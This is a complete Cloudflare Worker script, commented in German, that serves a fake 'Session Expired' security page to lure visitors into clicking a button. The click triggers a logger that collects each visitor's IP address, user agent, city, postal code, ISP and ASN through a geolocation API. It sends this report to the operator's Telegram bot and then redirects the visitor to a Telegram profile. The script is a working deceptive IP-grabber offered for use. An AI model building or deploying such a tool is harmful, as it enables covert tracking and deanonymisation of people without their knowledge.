export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);

    // --- TEIL 1: DIE FAKE-WEBSITE (Startseite) ---
    if (url.pathname === "/" || url.pathname === "/leak") {
      const tag = url.searchParams.get('c') || 'default';
      
      const html = `
      <!DOCTYPE html>
      <html lang="en">
      <head>
          <meta charset="UTF-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <title>Security Gateway</title>
          <style>
              body { background-color: #0f0f0f; color: #ffffff; font-family: -apple-system, BlinkMacSystemFont, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
              .container { background: #1a1a1a; padding: 40px 20px; border-radius: 8px; border: 1px solid #333; max-width: 400px; width: 90%; box-shadow: 0 10px 30px rgba(0,0,0,0.8); }
              h1 { color: #ff4444; font-size: 20px; margin-bottom: 10px; text-transform: uppercase; letter-spacing: 1px; }
              p { color: #aaaaaa; font-size: 14px; margin-bottom: 30px; line-height: 1.5; }
              .btn { display: block; width: 100%; padding: 15px; background-color: #ffffff; color: #000000; text-decoration: none; font-weight: bold; font-size: 16px; border-radius: 5px; box-sizing: border-box; transition: 0.2s; }
              .btn:hover { background-color: #cccccc; }
          </style>
      </head>
      <body>
          <div class="container">
              <h1>Session Expired</h1>
              <p>This session is not supported. Please open in a secure browser to continue.</p>
              
              <!-- Der Button führt jetzt auf eine saubere /go Route -->
              <a href="/go?c=${tag}" class="btn">Open in Browser</a>
          </div>
      </body>
      </html>
      `;
      return new Response(html, { headers: { "Content-Type": "text/html; charset=utf-8" } });
    }

    // --- TEIL 2: DER LOGGER & REDIRECT ---
    if (url.pathname === "/go") {
      const ip = request.headers.get("CF-Connecting-IP") || "unknown";
      const ua = request.headers.get("User-Agent") || "unknown";
      const tag = url.searchParams.get("c") || "unbekannt";
      const t = new Date().toLocaleString("de-DE", { timeZone: "Europe/Berlin" });

      // Alle Variablen vorbereiten
      let ipVersion = "Unbekannt";
      let loc = "Unbekannt";
      let isp = "Unbekannt";
      let asn = "Unbekannt";
      let postal = "Unbekannt";
      let continent = "Unbekannt";

      try {
        // Detaillierte API-Abfrage
        const res = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,zip,isp,org,as,continent,query`);
        const data = await res.json();
        
        if (data.status === "success") {
          // Prüfen, ob es IPv4 oder IPv6 ist
          ipVersion = ip.includes(':') ? "IPv6" : "IPv4";
          
          loc = `${data.zip || '?'} ${data.city || '?'}, ${data.regionName || '?'}, ${data.country || '?'}`;
          isp = data.isp || "?";
          asn = `${data.as || '?'} (${data.org || '?'})`;
          continent = data.continent || "?";
        }
      } catch (e) {}

      if (env.BOT_TOKEN && env.CHAT_ID) {
        // Formatierter, tödlicher Report für deinen Bot
        const msg = 
          `[${tag}]\n` +
          `------------------------\n` +
          `IP: ${ip} (${ipVersion})\n` +
          `Ort: ${loc}\n` +
          `Kontinent: ${continent}\n` +
          `Provider: ${isp}\n` +
          `ASN/Org: ${asn}\n` +
          `Zeit: ${t}\n` +
          `------------------------\n` +
          `Device: ${ua}`;

        try {
          await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: env.CHAT_ID, text: msg })
          });
        } catch (e) {}
      }

      // Um sicherzugehen, dass Telegram die Nachricht sendet, 
      // warten wir 200 Millisekunden, BEVOR wir weiterleiten.
      await new Promise(r => setTimeout(r, 200));

      // Weiterleitung zu deinem Profil
      return Response.redirect("https://t.me/dein_telegram_username", 302);
    }

    return new Response("404 Not Found", { status: 404 });
  }
};
